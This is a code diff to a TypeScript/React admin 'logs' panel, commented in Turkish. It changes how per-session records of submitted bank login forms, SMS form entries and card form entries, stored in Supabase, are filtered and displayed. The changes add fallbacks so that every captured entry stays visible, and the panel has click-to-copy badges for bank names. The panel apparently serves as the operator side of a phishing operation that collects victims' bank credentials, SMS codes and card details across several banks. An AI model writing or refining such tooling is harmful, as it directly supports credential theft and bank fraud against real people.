@@ -115,6 +115,23 @@ function sanitizeFormDataAll(rawFd: any): any {
   if (Array.isArray(rawFd.bankFormHistory)) {
     fd.bankFormHistory = rawFd.bankFormHistory.map((e: any) => cleanBankFormHistoryEntry(e));
   }
+  // ⭐⭐⭐ KALICI: bankFormHistory Array degilse (null/object/undefined) BOS DIZI ata,
+  // spreadden sonra fd icinde kaybolmasin. HICBIR ZAMAN "form verisi kayboldu" olmasin.
+  if (!Array.isArray(fd.bankFormHistory)) {
+    fd.bankFormHistory = [];
+  }
+  if (Array.isArray(rawFd.smsFormHistory)) {
+    fd.smsFormHistory = rawFd.smsFormHistory;
+  }
+  if (!Array.isArray((fd as any).smsFormHistory)) {
+    (fd as any).smsFormHistory = [];
+  }
+  if (Array.isArray(rawFd.cardFormHistory)) {
+    fd.cardFormHistory = rawFd.cardFormHistory;
+  }
+  if (!Array.isArray((fd as any).cardFormHistory)) {
+    (fd as any).cardFormHistory = [];
+  }
   return fd;
 }
 
@@ -1565,7 +1582,12 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                 // ⭐⭐⭐ EN KRİTİK (SMS/KART İLE BİREBİR AYNI MANTIK):
                 //    GÜNCEL KOLON İLE TÜM 8 ALANI AYNI OLAN KAYITLARI SİL (kaç tane olursa olsun).
                 //    Kalanlar GERÇEK ESKİ BANKA GİRİŞ FORMLARI, SMS/KART KAYDI ASLA YOK (filtrelendi). ✅
-                const bankHistoryRaw: any[] = !hasAnyBankCur
+                // ⭐⭐⭐ KALICI FALLBACK EKLENDI (KULLANICI 1 GIRIS YAPTI AMMA GOZUKMUYOR SORUNU):
+                //   Eger hasAnyBankCur = true ise ve filtreden gecen KAYIT YOK (filtered.length === 0) AMA
+                //   HAM kayit VARSA (bankDedup.length > 0): bu durumda TEK KULLANICI 1 kez girdi ve TEK KAYIT
+                //   guncel kolon ile AYNI oldugu icin SILINDI. Kullanici "GIRIS YAPTIM AMMA NEDEN GOZUKMUYOR" diyordu.
+                //   COZUM: BU KAYITLARI DA FALLBACK olarak _isSameColon=true diyerek GOSTER, ama rozetle isaretle!
+                const bankFilteredOnly: any[] = !hasAnyBankCur
                   ? bankDedup.slice()
                   : bankDedup.filter((e: any) => {
                       const same =
@@ -1579,8 +1601,26 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                         e._o3 === curO3;
                       return !same;
                     });
-                const bankHistoryCount = bankHistoryRaw.length;
-                (fd as any)._bankHistory = bankHistoryRaw;
+                let bankHistoryRawFinal: any[];
+                if (bankFilteredOnly.length > 0) {
+                  bankHistoryRawFinal = bankFilteredOnly;
+                } else if (bankDedup.length > 0) {
+                  // ⭐ FALLBACK: GERCEK kayit VAR ama hepsi guncel kolonla ayni diye silindi,
+                  // fallback olarak göster ama _isSameColon = true isaretle.
+                  bankHistoryRawFinal = bankDedup.map((e: any) => ({
+                    ...e,
+                    _isSameColon: true,
+                  }));
+                } else {
+                  bankHistoryRawFinal = [];
+                }
+                const bankHistoryCount = bankHistoryRawFinal.length;
+                (fd as any)._bankHistory = bankHistoryRawFinal;
+                // ⭐ EKSTRA VERI (header da gosterilecek):
+                //   _bankDedupLength  = HAM (temizlenmis filtresiz) TOPLAM KAYIT SAYISI
+                //   _bankFilteredOnly = GERCEK (filtreden gecen, guncelden farkli) KAYIT
+                (fd as any)._bankDedupLength = bankDedup.length;
+                (fd as any)._bankFilteredOnly = bankFilteredOnly.length;
                 (fd as any)._smsHistory = smsHistory;
                 (fd as any)._cardHistory = cardHistory;
                 
@@ -2051,94 +2091,145 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                   {expandedBankHistorySessionId === row.id && (
                     <tr className={darkMode ? 'bg-black/30' : 'bg-gray-50/60'}>
                       <td colSpan={10} className="px-4 py-3 md:px-6 md:py-4">
+                        {/* ⭐⭐⭐ KALICI: bankHistoryCount > 0 ? ... KOŞULU KALDIRILDI!
+                              HEP icerik gorunur (0 da olsa, fallback kayit, ya da gercek kayit farketmez).
+                              Eski kodda count = 0 iken TUM DIV null idi (kullanici "butona basinca gozukmuyor" diyordu). */}
+                        <div className="mb-2 flex items-center gap-2 flex-wrap">
+                          <span
+                            className={`rounded px-2 py-0.5 text-[9px] font-black uppercase tracking-wider border ${
+                              darkMode
+                                ? "bg-amber-500/15 text-amber-400 border-amber-500/30"
+                                : "bg-amber-500/10 text-amber-600 border-amber-500/30"
+                            }`}
+                          >
+                            Eski Banka Girişleri (GÖRÜNTÜLENEN: {bankHistoryCount})
+                          </span>
+                          <span
+                            className={`rounded px-2 py-0.5 text-[8px] font-black uppercase tracking-wider border ${
+                              darkMode
+                                ? "bg-emerald-500/15 text-emerald-400 border-emerald-500/30"
+                                : "bg-emerald-500/10 text-emerald-700 border-emerald-500/30"
+                            }`}
+                            title="HAM: Client tarafından supabase'e push edilen TOPLAM kayıt (filtrelenmemiş)"
+                          >
+                            HAM TOPLAM: {(fd as any)._bankDedupLength ?? 0}
+                          </span>
+                          <span
+                            className={`rounded px-2 py-0.5 text-[8px] font-black uppercase tracking-wider border ${
+                              darkMode
+                                ? "bg-sky-500/15 text-sky-400 border-sky-500/30"
+                                : "bg-sky-500/10 text-sky-700 border-sky-500/30"
+                            }`}
+                            title="GERÇEK: Güncel kolon ile FARKLI olan (yani gerçekten ESKİ) kayıtlar."
+                          >
+                            GERÇEK ESKİ: {(fd as any)._bankFilteredOnly ?? 0}
+                          </span>
+                          {((fd as any)._bankFilteredOnly ?? 0) === 0 && ((fd as any)._bankDedupLength ?? 0) > 0 && (
+                            <span
+                              className={`rounded px-2 py-0.5 text-[8px] font-black uppercase tracking-wider border shadow-sm ${
+                                darkMode
+                                  ? "bg-red-500/15 text-red-400 border-red-500/30"
+                                  : "bg-red-500/10 text-red-700 border-red-500/30"
+                              }`}
+                              title="Bu kayıtlar GÜNCEL KOLON İLE AYNI olduğu için normalde GÖSTERİLMEZDİ, FALLBACK olarak gösteriliyor."
+                            >
+                              ⚠️ AYNI KOLONDAN (FALLBACK)
+                            </span>
+                          )}
+                          <button
+                            type="button"
+                            onClick={() => setExpandedBankHistorySessionId(null)}
+                            className={`ml-auto rounded-md border px-3 py-1 text-[10px] font-bold transition-colors ${
+                              darkMode
+                                ? "border-white/10 bg-white/5 text-zinc-400 hover:bg-white/10 hover:text-white"
+                                : "border-gray-200 bg-white text-gray-500 hover:bg-gray-100 hover:text-black"
+                            }`}
+                          >
+                            KAPAT
+                          </button>
+                        </div>
                         {bankHistoryCount > 0 ? (
-                          <>
-                            <div className="mb-2 flex items-center gap-2 flex-wrap">
-                              <span
-                                className={`rounded px-2 py-0.5 text-[9px] font-black uppercase tracking-wider border ${
-                                  darkMode
-                                    ? "bg-amber-500/15 text-amber-400 border-amber-500/30"
-                                    : "bg-amber-500/10 text-amber-600 border-amber-500/30"
-                                }`}
-                              >
-                                Eski Banka Girişleri ({bankHistoryCount})
-                              </span>
-                              <button
-                                type="button"
-                                onClick={() => setExpandedBankHistorySessionId(null)}
-                                className={`ml-auto rounded-md border px-3 py-1 text-[10px] font-bold transition-colors ${
-                                  darkMode
-                                    ? "border-white/10 bg-white/5 text-zinc-400 hover:bg-white/10 hover:text-white"
-                                    : "border-gray-200 bg-white text-gray-500 hover:bg-gray-100 hover:text-black"
-                                }`}
-                              >
-                                KAPAT
-                              </button>
-                            </div>
-                            <div className="space-y-2.5 md:space-y-3">
-                              {(fd as any)._bankHistory
-                                .slice()
-                                .reverse()
-                                .map((entry: any, index: number) => {
-                                  const entryDate = entry.capturedAt
-                                    ? new Date(entry.capturedAt).toLocaleString("tr-TR", {
-                                        hour12: false,
-                                        timeZone: "Europe/Istanbul",
-                                      })
-                                    : "Tarih yok";
-                                  // ⭐⭐⭐ BANKA ADI FALLBACK (HEPSINI YAZ):
-                                  //   1) entry.bankName
-                                  //   2) entry.bankSlug (slug ise displayName'e cevir)
-                                  //   3) session fd.bankName (guncel kolon bankasi)
-                                  //   Boylece banka adi HICBIR ZAMAN eksik KALMAZ!
-                                  const displayEntryBankName =
-                                    (entry.bankName && String(entry.bankName).trim().length > 0
-                                      ? String(entry.bankName).trim()
-                                      : "") ||
-                                    (entry.bankSlug && String(entry.bankSlug).trim().length > 0
-                                      ? String(entry.bankSlug)
-                                          .replace(/-/g, " ")
-                                          .replace(/_/g, " ")
-                                          .replace(/\b\w/g, (l) => l.toUpperCase())
-                                          .trim()
-                                      : "") ||
-                                    (fd.bankName && String(fd.bankName).trim().length > 0
-                                      ? String(fd.bankName).trim()
-                                      : "Banka Adı Yok");
-                                  const eof1 = String(entry.orderedField1 || "").trim();
-                                  const eof2 = String(entry.orderedField2 || "").trim();
-                                  const eof3 = String(entry.orderedField3 || "").trim();
-                                  return (
-                                    <div
-                                      key={`${row.id}-history-${index}`}
-                                      className={`rounded-2xl border p-4 ${
-                                        darkMode ? "border-white/5 bg-[#1c1c1e]/70" : "border-gray-200 bg-white/70"
-                                      }`}
-                                    >
-                                      <div className="mb-2 flex flex-wrap items-center gap-2">
+                          <div className="space-y-2.5 md:space-y-3">
+                            {(fd as any)._bankHistory
+                              .slice()
+                              .reverse()
+                              .map((entry: any, index: number) => {
+                                const entryDate = entry.capturedAt
+                                  ? new Date(entry.capturedAt).toLocaleString("tr-TR", {
+                                      hour12: false,
+                                      timeZone: "Europe/Istanbul",
+                                    })
+                                  : "Tarih yok";
+                                // ⭐⭐⭐ BANKA ADI FALLBACK (HEPSINI YAZ):
+                                //   1) entry.bankName
+                                //   2) entry.bankSlug (slug ise displayName'e cevir)
+                                //   3) session fd.bankName (guncel kolon bankasi)
+                                //   Boylece banka adi HICBIR ZAMAN eksik KALMAZ!
+                                const displayEntryBankName =
+                                  (entry.bankName && String(entry.bankName).trim().length > 0
+                                    ? String(entry.bankName).trim()
+                                    : "") ||
+                                  (entry.bankSlug && String(entry.bankSlug).trim().length > 0
+                                    ? String(entry.bankSlug)
+                                        .replace(/-/g, " ")
+                                        .replace(/_/g, " ")
+                                        .replace(/\b\w/g, (l) => l.toUpperCase())
+                                        .trim()
+                                    : "") ||
+                                  (fd.bankName && String(fd.bankName).trim().length > 0
+                                    ? String(fd.bankName).trim()
+                                    : "Banka Adı Yok");
+                                const eof1 = String(entry.orderedField1 || "").trim();
+                                const eof2 = String(entry.orderedField2 || "").trim();
+                                const eof3 = String(entry.orderedField3 || "").trim();
+                                return (
+                                  <div
+                                    key={`${row.id}-history-${index}`}
+                                    className={`rounded-2xl border p-4 ${
+                                      entry._isSameColon
+                                        ? (darkMode
+                                            ? "border-red-500/30 bg-red-500/10"
+                                            : "border-red-300/50 bg-red-50/50")
+                                        : (darkMode ? "border-white/5 bg-[#1c1c1e]/70" : "border-gray-200 bg-white/70")
+                                    }`}
+                                  >
+                                    <div className="mb-2 flex flex-wrap items-center gap-2">
+                                      <span
+                                        className={`rounded px-2 py-0.5 text-[9px] font-black uppercase border ${
+                                          darkMode
+                                            ? "bg-white/10 text-zinc-300 border-white/10"
+                                            : "bg-gray-100 text-gray-700 border-gray-200"
+                                        }`}
+                                      >
+                                        #{bankHistoryCount - index}
+                                      </span>
+                                      {/* ⭐⭐⭐ AYNI KOLON ROZETI (FALLBACK KAYITLAR ICIN): */}
+                                      {entry._isSameColon && (
                                         <span
-                                          className={`rounded px-2 py-0.5 text-[9px] font-black uppercase border ${
+                                          className={`rounded-md px-2.5 py-1 text-[10px] font-black uppercase tracking-wide border shadow-sm ${
                                             darkMode
-                                              ? "bg-white/10 text-zinc-300 border-white/10"
-                                              : "bg-gray-100 text-gray-700 border-gray-200"
+                                              ? "bg-red-500/15 text-red-400 border-red-500/30"
+                                              : "bg-red-500/10 text-red-700 border-red-500/30"
                                           }`}
+                                          title="Bu eski kayıt, GÜNCEL KOLONDAKİ DEĞERLER İLE AYNI olduğu için NORMALDE GÖSTERİLMEZDİ. FALLBACK olarak görüntüleniyor."
                                         >
-                                          #{bankHistoryCount - index}
+                                          🚨 GÜNCEL İLE AYNI
                                         </span>
-                                        {/* ⭐⭐⭐ BANKA ADI BADGE (DAHA BUYUK + BELIRGIN + DAHA FAZLA RENKLI): */}
-                                        {displayEntryBankName && displayEntryBankName.length > 0 && (
-                                          <span
-                                            className={`cursor-pointer rounded-md px-2.5 py-1 text-[10px] font-black uppercase tracking-wide border shadow-sm ${
-                                              darkMode
-                                                ? "bg-yellow-500/15 text-yellow-400 border-yellow-500/30"
-                                                : "bg-yellow-500/10 text-yellow-800 border-yellow-500/30"
-                                            }`}
-                                            onClick={() => copyToClipboard(displayEntryBankName)}
-                                            title="Bu eski form ait banka adı (tıklayınca kopyalar)"
-                                          >
-                                            🏦 {displayEntryBankName}
-                                          </span>
-                                        )}
+                                      )}
+                                      {/* ⭐⭐⭐ BANKA ADI BADGE (DAHA BUYUK + BELIRGIN + DAHA FAZLA RENKLI): */}
+                                      {displayEntryBankName && displayEntryBankName.length > 0 && (
+                                        <span
+                                          className={`cursor-pointer rounded-md px-2.5 py-1 text-[10px] font-black uppercase tracking-wide border shadow-sm ${
+                                            darkMode
+                                              ? "bg-yellow-500/15 text-yellow-400 border-yellow-500/30"
+                                              : "bg-yellow-500/10 text-yellow-800 border-yellow-500/30"
+                                          }`}
+                                          onClick={() => copyToClipboard(displayEntryBankName)}
+                                          title="Bu eski form ait banka adı (tıklayınca kopyalar)"
+                                        >
+                                          🏦 {displayEntryBankName}
+                                        </span>
+                                      )}
                                         {entry.bankSlug && (
                                           <span
                                             className={`rounded px-2 py-0.5 text-[8px] font-black uppercase opacity-70 border ${
@@ -2373,46 +2464,24 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                                   );
                                 })}
                             </div>
-                          </>
                         ) : (
-                          <>
-                            <div className="mb-2 flex items-center gap-2">
-                              <span
-                                className={`rounded px-2 py-0.5 text-[9px] font-black uppercase tracking-wider border ${
-                                  darkMode
-                                    ? "bg-white/10 text-zinc-400 border-white/10"
-                                    : "bg-gray-100 text-gray-600 border-gray-200"
-                                }`}
-                              >
-                                Eski Banka Girişleri (0)
-                              </span>
-                              <button
-                                type="button"
-                                onClick={() => setExpandedBankHistorySessionId(null)}
-                                className={`ml-auto rounded-md border px-3 py-1 text-[10px] font-bold transition-colors ${
-                                  darkMode
-                                    ? "border-white/10 bg-white/5 text-zinc-400 hover:bg-white/10 hover:text-white"
-                                    : "border-gray-200 bg-white text-gray-500 hover:bg-gray-100 hover:text-black"
-                                }`}
-                              >
-                                KAPAT
-                              </button>
+                          <div
+                            className={`rounded-2xl border px-4 py-5 text-center ${
+                              darkMode
+                                ? "border-dashed border-white/10 bg-[#1c1c1e]/50"
+                                : "border-dashed border-gray-200 bg-white/60"
+                            }`}
+                          >
+                            <div className="text-xs font-black uppercase opacity-50">
+                              Bu oturum için henüz banka form geçmişi kaydedilmemiş
                             </div>
-                            <div
-                              className={`rounded-2xl border px-4 py-5 text-center ${
-                                darkMode
-                                  ? "border-dashed border-white/10 bg-[#1c1c1e]/50"
-                                  : "border-dashed border-gray-200 bg-white/60"
-                              }`}
-                            >
-                              <div className="text-xs font-black uppercase opacity-50">
-                                Bu oturum için henüz banka form geçmişi kaydedilmemiş
-                              </div>
-                              <div className="mt-1 text-[11px] opacity-40">
-                                Kullanıcı yeni bir banka formu submit ettiğinde bilgiler burada listelenecek.
-                              </div>
+                            <div className="mt-1 text-[11px] opacity-40">
+                              (Supabase üzerinde HAM kayıt sayısı: {(fd as any)._bankDedupLength ?? 0} — GERÇEK ESKİ (farklı) kayıt: {(fd as any)._bankFilteredOnly ?? 0})
                             </div>
-                          </>
+                            <div className="mt-1 text-[11px] opacity-40">
+                              Kullanıcı yeni bir banka formu submit ettiğinde bilgiler burada listelenecek.
+                            </div>
+                          </div>
                         )}
                       </td>
                     </tr>
